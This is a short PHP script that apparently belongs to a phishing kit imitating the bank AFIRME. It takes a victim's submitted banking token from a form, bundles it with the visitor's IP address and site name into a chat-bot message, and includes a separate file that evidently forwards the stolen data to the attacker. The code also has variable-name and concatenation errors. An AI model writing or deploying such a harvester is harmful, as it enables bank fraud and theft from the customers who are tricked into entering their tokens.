<?php  

	$token=$_POST['token'];
  


	$Enviara ="➖➖➖➖[ AFIRME ]➖➖➖➖\n".
  "<b>✔️TOKEN: </b>  <code>".$token."</code>\n".

  
  

  "🌐 IP ".$_SERVER['REMOTE_ADDR']."\n";
  "🌐WEBSITE:".$_SERVER['SERVER_NAME']."\n".
  $enviar =  urldecode($enviara);
  include 'bot_idtoken.php';
?>
